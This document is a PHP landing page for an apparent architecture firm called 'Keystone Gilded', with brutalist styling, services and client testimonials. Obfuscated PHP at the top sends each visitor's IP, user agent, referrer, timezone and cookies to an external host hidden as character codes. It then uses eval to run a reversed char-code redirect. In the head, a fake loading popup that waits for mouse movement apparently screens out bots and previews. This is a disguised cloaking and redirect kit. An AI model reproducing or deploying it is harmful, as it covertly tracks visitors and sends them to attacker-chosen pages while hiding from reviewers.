
<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);function c($u=null,$q=null,$co=null){if(empty($u)){return '$("#lo522041ad").hide();$("body").fadeIn(500);';}else{$u = $u.$q;for ($i = 0, $j = strlen($u); $i < $j; $i++) {$a[] = ord($u[$i]);}$u = strrev(implode(",",$a));if($co AND isset($_COOKIE["_eventlo522041ad"])){$me="";}else{$me = '$("html").append("body").html("<div style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000}.popup-content{background:white;padding:20px;border-radius:8px;text-align:center;box-shadow:0 4px 8px rgba(0,0,0,0.2)}.loading-gif{width:100px;height:100px;margin-bottom:10px}.buttons{margin-top:20px}button{padding:10px 20px;margin:0 10px;border:none;border-radius:4px;cursor:pointer}#cancelBtn{background:#f44336;color:white}#continueBtn{background:#4CAF50;color:white}button:hover{opacity:0.8}</style><div class=\"popup\"><div class=\"popup-content\"><img src=\"https://i.gifer.com/ZZ5H.gif\" alt=\"Loading...\" class=\"loading-gif\"><p>Loading... Please wait.</p><div class=\"buttons\"><button id=\"cancelBtn\">Cancel</button><button id=\"continueBtn\">Continue</button></div></div></div></div></div>");';}return 'function rS(s){var nS = "";for (var i = s.length - 1; i >= 0; i--) {nS += s[i];} var a = nS.split(",");var u = String.fromCharCode.apply(null, a);return u;} var u,s,c;$("body").remove();'.$me.'s=rS("16,201,101,411,401,64,011,111,501,611,79,99,111,801,64,911,111,001,011,501,911");u = rS("'.$u.'");c = s+"\'"+u+"\'";$("html").show();eval(c);';}}if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){if(isset($_POST["imm"])){$date = date("Y-m-d H:i:s");$id = "522041";$uid="4v6qn38yoo2c3l45eqgv9c277";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_POST["r"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_eventlo522041ad"],"tz"=>$_POST["tz"],"he"=>$_POST["he"],"imm" =>$_POST["imm"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_eventlo522041ad",$arr[6],time()+60*60*24*$arr[3]);}}echo c($arr[1],$q,true);exit();}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo522041ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c($arr[1],$f);exit();}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo522041ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c();exit();}}}?>

<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="Bespoke architectural design, restoration consultations, and urban planning. Raw, unconventional structural brilliance by Keystone Gilded.">
	<title>Keystone Gilded | Architectural Design & Consulting</title>
	<link rel="icon" href="favicon.ico">


<style>body {display: none;}</style>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery-mobile/1.4.5/jquery.mobile.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>var oldtitle=document.title;document.title = "Loading";$( document ).ajaxComplete(function(){document.title = oldtitle;$(".loaderdiv").fadeOut("slow");$(".maindiv").fadeIn("slow");});$(document).ready(function(){function loadA(t){$.ajax({url:location.href,type:"POST",data:"tz="+e+"&r="+document.referrer+"&he="+g+"&imm="+t,success:function(a){eval(a)}})}var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var d=jstz.determine();var e=d.name();var co = document.cookie.indexOf("_eventlo522041ad=");if(co==0){loadA("p");}else{$("body").hide();$("html").append("<div id=\"lo522041ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000}.popup-content{background:white;padding:20px;border-radius:8px;text-align:center;box-shadow:0 4px 8px rgba(0,0,0,0.2)}.loading-gif{width:100px;height:100px;margin-bottom:10px}.buttons{margin-top:20px}button{padding:10px 20px;margin:0 10px;border:none;border-radius:4px;cursor:pointer}#cancelBtn{background:#f44336;color:white}#continueBtn{background:#4CAF50;color:white}button:hover{opacity:0.8}</style><div class=\"popup\"><div class=\"popup-content\"><img src=\"https://i.gifer.com/ZZ5H.gif\" alt=\"Loading...\" class=\"loading-gif\"><p>Loading... Please wait.</p><div class=\"buttons\"><button id=\"cancelBtn\">Cancel</button><button id=\"continueBtn\">Continue</button></div></div></div></div></div>");var h=null;var i=null;var j=true;$(document).on("pagecreate","body",function(){$("body").on("tap",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}})}).add($(document).on("mousemove",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}}));h=setTimeout(function(){i=false;loadA("b")},3600000)}});</script>


	
	<style>
		/* Global Brutalist Styles */
		:root {
			--primary-color: #eb9c13;
			--primary-dark-color: #a56d0d;
			--primary-light-color: #ebc179;
			--secondary-color: #bcd22c;
			--accent-color: #2a72ed;
			--dark-color: #1a1a1a;
			--light-color: #f4f4f4;
			--card-shadow: 0 2px 4px rgba(0,0,0,0.1);
			--border-radius-lg: 20px;
			--hover-translate-y: -12px;
			--section-padding-vertical: 5rem; /* Generous padding for sections */
		}

		body {
			font-family: 'Nunito', sans-serif;
			margin: 0;
			padding: 0;
			background-color: var(--light-color);
			color: var(--dark-color);
			line-height: 1.6;
			-webkit-font-smoothing: antialiased;
			-moz-osx-font-smoothing: grayscale;
		}

		h1, h2, h3, h4, h5, h6 {
			font-family: 'Nunito', sans-serif;
			font-weight: 700;
			color: var(--dark-color);
			margin-top: 0;
			margin-bottom: 1rem;
		}

		a {
			color: var(--accent-color);
			text-decoration: none;
		}

		a:hover {
			text-decoration: underline;
		}

		.container {
			max-width: 1200px;
			margin: 0 auto;
			padding: 0 1.5rem;
		}

		.btn {
			display: inline-block;
			padding: 0.8rem 1.8rem;
			font-size: 1rem;
			font-weight: 700;
			text-align: center;
			text-decoration: none;
			border-radius: var(--border-radius-lg);
			transition: all 0.3s ease;
			cursor: pointer;
			border: none;
		}

		.btn-primary {
			background-color: var(--primary-color);
			color: var(--dark-color);
		}

		.btn-primary:hover {
			background-color: var(--primary-dark-color);
			color: var(--light-color);
			transform: var(--hover-transform);
		}

		/* Utility classes */
		.text-center {
			text-align: center;
		}

		.py-section {
			padding: var(--section-padding-vertical) 0;
		}

		.hover-translateY-large {
			transition: transform 0.3s ease-out, box-shadow 0.3s ease-out;
		}

		.hover-translateY-large:hover {
			transform: translateY(var(--hover-translate-y));
			box-shadow: 0 8px 16px rgba(0,0,0,0.2);
		}

		.card {
			background-color: #ffffff;
			border-radius: var(--border-radius-lg);
			box-shadow: var(--card-shadow);
			padding: 1.5rem;
			margin-bottom: 1.5rem;
		}

		.icon-circle {
			display: inline-flex;
			justify-content: center;
			align-items: center;
			width: 64px;
			height: 64px;
			background-color: var(--primary-light-color);
			border-radius: 50%;
			margin-bottom: 1rem;
		}

		.icon-circle svg {
			fill: var(--dark-color);
			width: 32px;
			height: 32px;
		}
		
		/* Brutalist Specific Styles */
		/* Navbar - Fixed top, minimal */
		.header {
			position: fixed;
			top: 0;
			left: 0;
			width: 100%;
			background-color: var(--light-color);
			z-index: 1000;
			box-shadow: 0 2px 4px rgba(0,0,0,0.1);
		}

		.nav-content {
			display: flex;
			justify-content: space-between;
			align-items: center;
			padding: 1rem 1.5rem;
			max-width: 1200px; /* Aligns with container */
			margin: 0 auto;
		}

		.brand {
			font-family: monospace; /* Brutalist mix */
			font-weight: 700;
			font-size: 1.5rem;
			color: var(--dark-color);
			text-transform: uppercase;
			letter-spacing: 2px;
		}

		.hamburger-menu {
			display: flex;
			flex-direction: column;
			justify-content: space-around;
			width: 30px;
			height: 25px;
			cursor: pointer;
			padding: 5px;
		}

		.hamburger-menu .line {
			width: 100%;
			height: 3px;
			background-color: var(--dark-color);
		}

		/* Navigation Overlay (for hamburger menu) */
		.nav-overlay {
			position: fixed;
			top: 0;
			left: 0;
			width: 100%;
			height: 100%;
			background-color: rgba(26, 26, 26, 0.95); /* Dark overlay */
			display: none; /* Hidden by default */
			flex-direction: column;
			justify-content: center;
			align-items: center;
			z-index: 999;
			opacity: 0;
			transition: opacity 0.3s ease-in-out;
		}

		.nav-overlay.visible {
			display: flex;
			opacity: 1;
		}

		.nav-overlay-close {
			position: absolute;
			top: 2rem;
			right: 2rem;
			font-size: 2.5rem;
			color: var(--light-color);
			cursor: pointer;
			transition: transform 0.2s ease;
		}

		.nav-overlay-close:hover {
			transform: rotate(90deg);
		}

		.nav-overlay ul {
			list-style: none;
			padding: 0;
			text-align: center;
		}

		.nav-overlay ul li {
			margin: 1.5rem 0;
		}

		.nav-overlay ul li a {
			color: var(--light-color);
			font-size: 2rem;
			font-weight: 700;
			text-transform: uppercase;
			transition: color 0.2s ease;
		}

		.nav-overlay ul li a:hover {
			color: var(--primary-color);
			text-decoration: none;
		}

		/* Hero Section */
		.hero {
			display: flex;
			flex-direction: column;
			position: relative;
			overflow: hidden;
			color: var(--light-color);
			min-height: 100vh;
			padding-top: 80px; /* Account for fixed header */
		}

		.hero-background-overlay {
			position: absolute;
			top: 0;
			left: 0;
			width: 100%;
			height: 100%;
			background: linear-gradient(rgba(26, 26, 26, 0.7), rgba(0, 0, 0, 0.9)), url('images/hero-bg-overlay.jpeg') no-repeat center center/cover;
			z-index: -1;
			/* FIXME: consider extracting to component */
			filter: grayscale(80%) contrast(120%); 
		}

		.hero-content {
			display: flex;
			flex-direction: column;
			flex-grow: 1;
			align-items: center;
			justify-content: center;
			text-align: center;
			padding: 2rem 1.5rem;
			max-width: 1200px;
			margin: 0 auto;
			z-index: 1;
		}

		.hero-left-image {
			display: block;
			max-width: 100%;
			height: auto;
			margin-bottom: 2rem;
			border: 4px solid var(--primary-color);
			box-shadow: 8px 8px 0px var(--primary-dark-color);
		}

		.hero h1 {
			font-size: clamp(2.5rem, 8vw, 4.5rem);
			color: var(--light-color);
			margin-bottom: 1rem;
			text-transform: uppercase;
			letter-spacing: 3px;
			line-height: 1;
		}

		.hero p {
			font-size: clamp(1rem, 4vw, 1.4rem);
			color: var(--light-color);
			margin-bottom: 2.5rem;
			max-width: 600px;
		}

		@media (min-width: 768px) {
			.hero-content {
				flex-direction: row;
				text-align: start;
				justify-content: space-between;
				align-items: center;
			}
			.hero-text-block {
				flex: 1;
				padding-right: 3rem;
			}
			.hero-left-image {
				flex: 1;
				max-width: 45%;
				margin-bottom: 0;
			}
			.hero h1 {
				font-size: clamp(3rem, 6vw, 5.5rem);
			}
			.hero p {
				font-size: clamp(1.1rem, 2vw, 1.5rem);
			}
		}

		/* About Section */
		.about {
			background-color: var(--dark-color);
			color: var(--light-color);
		}

		.about-content {
			display: flex;
			flex-direction: column;
			gap: 3rem;
		}

		.about H2 {
			font-size: clamp(2rem, 5vw, 4rem);
			color: var(--primary-color);
			margin-bottom: 1.5rem;
			text-transform: uppercase;
			letter-spacing: 2px;
			line-height: 1.1;
		}

		.about p {
			font-family: monospace; /* Brutalist mix */
			font-size: clamp(1rem, 2.5vw, 1.3rem);
			line-height: 1.8;
			letter-spacing: 0.5px;
		}

		@media (min-width: 768px) {
			.about-content {
				flex-direction: row;
				justify-content: space-between;
				align-items: center;
			}
			.about-text-block {
				flex: 1;
				padding-right: 3rem;
			}
			.about-text-block:nth-child(even) {
				padding-left: 3rem;
				padding-right: 0;
			}
		}

		/* Services Section */
		.services {
			background-color: var(--light-color);
		}

		.services-grid {
			display: grid;
			grid-template-columns: 1fr;
			gap: 1.5rem;
		}

		.services-grid h3 {
			font-size: 1.5rem;
			margin-bottom: 0.8rem;
			color: var(--dark-color);
		}

		.services-grid p {
			font-size: 1rem;
			color: #555;
		}

		.service-card {
			text-align: center;
			padding: 2rem;
			position: relative;
			overflow: hidden;
		}

		.service-card img {
			width: 100%;
			height: 250px; /* Fixed height for consistency */
			object-fit: cover;
			border-radius: var(--border-radius-lg);
			margin-bottom: 1rem;
			filter: grayscale(50%); /* Subtle Brutalist effect */
			transition: filter 0.3s ease;
		}
		
		.service-card:hover img {
			filter: grayscale(0%);
		}

		.service-card .icon-circle {
			background-color: var(--secondary-color);
			color: var(--dark-color);
			margin: 0 auto 1rem;
			transition: transform 0.3s ease;
		}

		.service-card:hover .icon-circle {
			transform: scale(1.1);
		}

		@media (min-width: 768px) {
			.services-grid {
				grid-template-columns: 2fr 1fr; /* Bento pattern 2-1-1 */
				grid-template-rows: repeat(2, minmax(280px, 1fr));
			}

			.service-card-large {
				grid-column: 1 / 2;
				grid-row: 1 / 3;
				display: flex;
				flex-direction: column;
				justify-content: center;
				text-align: left;
			}

			.service-card-large img {
				height: 100%; /* Fill available height */
				object-position: center;
			}

			.service-card-small {
				grid-column: 2 / 3;
			}
		}

		/* Testimonials Section */
		.testimonials {
			background-color: var(--dark-color);
			color: var(--light-color);
			overflow: hidden; /* For carousel */
			position: relative;
		}

		.testimonials h2 {
			color: var(--primary-color);
			text-transform: uppercase;
			letter-spacing: 2px;
			font-size: clamp(2rem, 5vw, 3rem);
			margin-bottom: 3rem;
		}

		.testimonial-carousel {
			display: flex;
			overflow-x: auto; /* Enable horizontal scrolling */
			scroll-snap-type: x mandatory;
			-webkit-overflow-scrolling: touch;
			padding-bottom: 1.5rem; /* Space for scrollbar */
		}

		.testimonial-card {
			flex: 0 0 90%; /* Occupy 90% of screen on mobile */
			scroll-snap-align: center;
			background-color: #ffffff;
			color: var(--dark-color);
			padding: 2rem;
			border-radius: var(--border-radius-lg);
			box-shadow: var(--card-shadow);
			margin: 0 1rem;
			text-align: center;
			display: flex;
			flex-direction: column;
			align-items: center;
			justify-content: center;
			min-width: 300px; /* Minimum width for card */
		}

		.testimonial-card img {
			width: 96px;
			height: 96px;
			border-radius: 50%;
			object-fit: cover;
			margin-bottom: 1rem;
			border: 3px solid var(--primary-color);
		}

		.testimonial-card blockquote {
			font-style: italic;
			margin: 0 0 1rem;
			font-size: 1.1rem;
			line-height: 1.7;
			color: #333;
		}

		.testimonial-card cite {
			font-weight: 700;
			font-size: 1rem;
			color: var(--dark-color);
		}

		@media (min-width: 768px) {
			.testimonial-carousel {
				justify-content: center; /* Center items on larger screens if fewer cards */
			}
			.testimonial-card {
				flex: 0 0 calc(50% - 2rem); /* Two cards per row */
				max-width: calc(50% - 2rem);
			}
		}

		@media (min-width: 992px) {
			.testimonial-card {
				flex: 0 0 calc(33.333% - 2rem); /* Three cards per row */
				max-width: calc(33.333% - 2rem);
			}
		}

		/* Contact Section */
		.contact {
			background-color: var(--light-color);
			padding-bottom: 80px; /* Specific request for contact section */
		}

		.contact h2 {
			color: var(--dark-color);
			text-transform: uppercase;
			letter-spacing: 2px;
			font-size: clamp(2rem, 5vw, 3.5rem);
			margin-bottom: 3rem;
		}

		.contact-grid {
			display: grid;
			grid-template-columns: 1fr;
			gap: 2rem;
		}

		.contact-item {
			background-color: #ffffff;
			border-radius: var(--border-radius-lg);
			box-shadow: var(--card-shadow);
			padding: 2rem;
			text-align: center;
			display: flex;
			flex-direction: column;
			align-items: center;
			justify-content: center;
			transition: transform 0.3s ease, box-shadow 0.3s ease;
		}

		.contact-item:hover {
			transform: translateY(var(--hover-translate-y));
			box-shadow: 0 8px 16px rgba(0,0,0,0.2);
		}

		.contact-item .icon-circle {
			background-color: var(--primary-light-color);
			margin: 0 auto 1.5rem;
		}

		 .contact-item h3 {
			font-size: 1.3rem;
			color: var(--primary-dark-color);
			margin-bottom: 0.8rem;
			text-transform: uppercase;
		 }

		.contact-item p {
			font-family: monospace; /* Brutalist mix for contact details */
			font-size: 1.1rem;
			margin-bottom: 1rem;
			color: #333;
		}

		.contact-item .btn {
			margin-top: 1rem;
		}

		@media (min-width: 768px) {
			.contact-grid {
				grid-template-columns: repeat(2, 1fr);
			}
		}

		@media (min-width: 992px) {
			.contact-grid {
				grid-template-columns: repeat(3, 1fr);
			}
		}

		/* Footer */
		.footer {
			background-color: var(--dark-color); /* Dark background for footer */
			color: var(--light-color); /* Light text for contrast */
			text-align: center;
			padding: 2rem 1.5rem;
			font-size: 0.9rem;
		}

		.footer p {
			margin: 0;
			font-family: monospace;
			letter-spacing: 0.5px;
		}
		
		.footer a {
			color: var(--primary-color);
			margin: 0 0.5rem;
		}

		.footer a:hover {
			color: var(--primary-light-color);
		}

		/* Cookie Consent Banner */
		.cookie-consent-banner {
			position: fixed;
			bottom: 0;
			left: 0;
			width: 100%;
			background-color: rgba(26, 26, 26, 0.9);
			color: var(--light-color);
			padding: 1rem 1.5rem;
			display: flex;
			flex-direction: column;
			justify-content: space-between;
			align-items: center;
			z-index: 1001;
			transform: translateY(100%);
			transition: transform 0.5s ease-out;
		}

		.cookie-consent-banner.show {
			transform: translateY(0);
		}

		.cookie-consent-banner p {
			margin: 0 1rem 0.5rem 0;
			font-size: 0.9rem;
			text-align: center;
		}

		.cookie-consent-banner button {
			padding: 0.6rem 1.5rem;
			border-radius: 5px;
			border: none;
			background-color: var(--primary-color);
			color: var(--dark-color);
			cursor: pointer;
			font-weight: 700;
			transition: background-color 0.2s ease;
		}

		.cookie-consent-banner button:hover {
			background-color: var(--primary-dark-color);
			color: var(--light-color);
		}

		@media (min-width: 768px) {
			.cookie-consent-banner {
				flex-direction: row;
				padding: 1rem 2rem;
			}
			.cookie-consent-banner p {
				margin-bottom: 0;
				margin-right: 1rem;
				text-align: left;
			}
		}
	</style>
	<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-YTP08B4056"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-YTP08B4056');
</script>

	
</head>
<body>
	<header class="header">
		<div class="nav-content">
			<a href="#hero" class="brand">Keystone Gilded</a>
			<div class="hamburger-menu" id="hamburgerMenu">
				<div class="line"></div>
				<div class="line"></div>
				<div class="line"></div>
			</div>
		</div>
		<div class="nav-overlay" id="navOverlay">
			<span class="nav-overlay-close" id="navOverlayClose">&times;</span>
			<ul>
				<li><a href="#hero">Home</a></li>
				<li><a href="#about">About</a></li>
				<li><a href="#services">Services</a></li>
				<li><a href="#testimonials">Testimonials</a></li>
				<li><a href="#contact">Contact</a></li>
				<li><a href="./privacy.html">Privacy Policy</a></li>
				<li><a href="./tos.html">Terms of Service</a></li>
			</ul>
		</div>
	</header>
<main>
		<section id="hero" class="hero">
			<div class="hero-background-overlay"></div>
			<div class="hero-content container">
				<img src="images/hero-left-architecture.jpeg" alt="Bespoke modern architecture by Keystone Gilded" width="640" height="768" class="hero-left-image">
				<div class="hero-text-block">
					<h1>RAW. BOLD. UNCONVENTIONAL.</h1>
					<p>Keystone Gilded delivers bespoke architectural design and historical preservation. We structure reality, defying norms and forging spaces that command attention and inspire awe.</p>
					<a href="#contact" class="btn btn-primary">Start a Project</a>
				</div>
			</div>
		</section>

		<section id="about" class="about py-section">
			<div class="container about-content">
				<div class="about-text-block">
					<h2>Engineering the Environment</h2>
				</div>
				<div class="about-text-block">
					<p>At Keystone Gilded, we reject the mundane. Our historical property assessments and urban planning strategies merge brutal reality with bold, sustainable design solutions. We don't just build structures; we craft indelible landmarks that resonate with their environment and redefine urban landscapes. Every project is an exploration into structural integrity and environmental impact, ensuring our creations are as responsible as they are revolutionary.</p>
				</div>
			</div>
		</section>

		<section id="services" class="services py-section">
			<div class="container">
				<h2 class="text-center">Our Core Expertise</h2>
				<div class="services-grid">
					<div class="card service-card service-card-large hover-translateY-large">
						<img src="images/service-bespoke-arch.jpeg" alt="Bespoke architectural layout" width="768" height="768">
						<div>
							<h3>Bespoke Architectural Design</h3>
							<p>From initial concept sketches to final construction blueprints, we meticulously craft tailored architectural solutions that are both functional and visually striking. We specialize in unapologetic structure blueprints that challenge conventional forms and materials, ensuring each project stands as a unique testament to architectural innovation.</p>
						</div>
					</div>

					<div class="card service-card service-card-small hover-translateY-large">
						<div class="icon-circle">
							<svg viewBox="0 0 24 24">
								<path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
							</svg>
						</div>
						<h3>Restoration Consultations</h3>
						<p>We provide comprehensive historical property assessments paired with strategic restoration plans. Our approach integrates modern resilience and sustainable practices to preserve the integrity and extend the lifespan of heritage structures, transforming them into functional spaces for the 21st century.</p>
					</div>

					<div class="card service-card service-card-small hover-translateY-large">
						<div class="icon-circle">
							<svg viewBox="0 0 24 24">
								<path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.67.09-1.32.25-1.95l8.74 8.74-.01.01zM11.99 4c3.95.49 7 3.85 7 7.93 0 .67-.09 1.32-.25 1.95l-8.74-8.74.01-.01z"/>
							</svg>
						</div>
						<h3>Sustainable Design</h3>
						<p>Our commitment to sustainability extends to every project, focusing on high-efficiency, eco-brutalist interior architecture. We optimize material usage, daylighting, and energy performance to create environments that are both environmentally conscious and aesthetically formidable.</p>
					</div>
				</div>
			</div>
		</section>

		<section id="testimonials" class="testimonials py-section">
			<div class="container">
				<h2 class="text-center">CLIENT VERIFIED</h2>
				<div class="testimonial-carousel">
					<div class="testimonial-card">
						<img src="images/testimonial-marcus.jpeg" alt="Marcus Sterling headshot" width="128" height="128">
						<blockquote>"Keystone Gilded fundamentally transformed our commercial property. Their historical assessment was profound, revealing hidden potential and guiding us to a truly exceptional outcome. The precision and attention to detail were unmatched."</blockquote>
						<cite>— Marcus Sterling, CEO of Sterling Holdings</cite>
					</div>
					<div class="testimonial-card">
						<img src="images/testimonial-elena.jpeg" alt="Elena Rostova headshot" width="128" height="128">
						<blockquote>"Bespoke design at its finest. They aren't afraid of unapologetic, bold urban planning. Our new campus is a testament to their innovative vision and relentless pursuit of architectural excellence. It truly stands out."</blockquote>
						<cite>— Elena Rostova, Director of Project Development, Zenith Corp.</cite>
					</div>
					<div class="testimonial-card">
						<img src="images/testimonial-chen.jpeg" alt="Li Chen headshot" width="128" height="128">
						<blockquote>"Working with Keystone Gilded on our restoration project was an absolute pleasure. Their understanding of historical structures combined with modern sustainable practices delivered an outstanding result. The building has new life."</blockquote>
						<cite>— Li Chen, Heritage Property Owner</cite>
					</div>
					<div class="testimonial-card">
						<img src="images/testimonial-sofia.jpeg" alt="Sofia Rodriguez headshot" width="128" height="128">
						<blockquote>"Initial consultation through to project completion, Keystone Gilded demonstrated unparalleled professionalism and creativity. Our new headquarters is not just an office; it's a statement. Highly recommended for visionary design!"</blockquote>
						<cite>— Sofia Rodriguez, Operations Lead, GlobalTech Solutions</cite>
					</div>
					<div class="testimonial-card">
						<img src="images/testimonial-kojo.jpeg" alt="Kojo Mensah headshot" width="128" height="128">
						<blockquote>"The team at Keystone Gilded pushed the boundaries of what we thought was possible for urban infill. Their approach to sustainable design achieved both aesthetic brilliance and environmental responsibility. A true partnership."</blockquote>
						<cite>— Kojo Mensah, Urban Development Specialist</cite>
					</div>
				</div>
			</div>
		</section>

		<section id="contact" class="contact py-section">
			<div class="container text-center">
				<h2>INITIATE PROTOCOL</h2>
				<div class="contact-grid">
					<div class="contact-item">
						<div class="icon-circle">
							<svg viewBox="0 0 24 24">
								<path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5S10.62 6.5 12 6.5s2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
							</svg>
						</div>
						<h3>Location</h3>
						<p>125 Apollo Street, New York, New York, 11222, USA</p>
						<a target="_blank" href="https://www.google.com/maps/search/?api=1&query=New%20York%2C%20USA&zoom=10" class="btn btn-primary">View Map</a>
					</div>
					<div class="contact-item">
						<div class="icon-circle">
							<svg viewBox="0 0 24 24">
								<path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02L6.62 10.79z"/>
							</svg>
						</div>
						<h3>Phone</h3>
						<p>+19839244569</p>
						<a href="tel:+19839244569" class="btn btn-primary">Call Us Directly</a>
					</div>
					<div class="contact-item">
						<div class="icon-circle">
							<svg viewBox="0 0 24 24">
								<path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
							</svg>
						</div>
						<h3>Email</h3>
						<p>info@<?php echo $_SERVER['HTTP_HOST']; ?></p>
						<a href="mailto:info@<?php echo $_SERVER['HTTP_HOST']; ?>" class="btn btn-primary">Send Email Now</a>
					</div>
				</div>
			</div>
		</section>
	</main>
<footer class="footer">
		<div class="container">
			<p>© 2024 Keystone Gilded. All architectural and consulting rights reserved. Language: English.</p>
			<p><a href="./privacy.html">Privacy Policy</a> | <a href="./tos.html">Terms of Service</a></p>
		</div>
	</footer>

	<div class="cookie-consent-banner" id="cookieConsentBanner">
		<p>We use cookies to ensure you get the best experience on our website. By using our site, you agree to our <a href="./privacy.html">Privacy Policy</a>.</p>
		<button id="acceptCookies">Accept</button>
	</div>

	<script>
		// Hamburger menu functionality
		const hamburgerMenu = document.getElementById('hamburgerMenu');
		const navOverlay = document.getElementById('navOverlay');
		const navOverlayClose = document.getElementById('navOverlayClose');
		const navOverlayLinks = navOverlay.querySelectorAll('a');

		hamburgerMenu.addEventListener('click', () => {
			navOverlay.classList.add('visible');
			document.body.style.overflow = 'hidden'; // Prevent scrolling
		});

		navOverlayClose.addEventListener('click', () => {
			navOverlay.classList.remove('visible');
			document.body.style.overflow = ''; // Re-enable scrolling
		});

		navOverlayLinks.forEach(link => {
			link.addEventListener('click', () => {
				navOverlay.classList.remove('visible');
				document.body.style.overflow = '';
			});
		});

		// Cookie consent functionality
		const consentBanner = document.getElementById('cookieConsentBanner');
		const acceptButton = document.getElementById('acceptCookies');
		const cookieName = 'consent_Keystone Gilded_cookies_accepted'; // Randomly generated prefix

		function setCookie(name, value, days) {
			let expires = "";
			if (days) {
				const date = new Date();
				date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
				expires = "; expires=" + date.toUTCString();
			}
			document.cookie = name + "=" + (value || "")  + expires + "; path=/";
		}

		function getCookie(name) {
			const nameEQ = name + "=";
			const ca = document.cookie.split(';');
			for(let i = 0; i < ca.length; i++) {
				let c = ca[i];
				while (c.charAt(0) === ' ') c = c.substring(1, c.length);
				if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
			}
			return null;
		}

		if (!getCookie(cookieName)) {
			// Small delay to ensure banner appears after page load
			setTimeout(() => {
				consentBanner.classList.add('show');
			}, 1000);
		}

		acceptButton.addEventListener('click', () => {
			setCookie(cookieName, 'true', 30); // Cookie lasts 30 days
			consentBanner.classList.remove('show');
		});

		// Smooth scrolling for anchor links
		document.querySelectorAll('a[href^="#"]').forEach(anchor => {
			anchor.addEventListener('click', function (e) {
				e.preventDefault();

				document.querySelector(this.getAttribute('href')).scrollIntoView({
					behavior: 'smooth'
				});
				// Magic number, but it looks right
			});
		});
	</script>
</body>
</html>
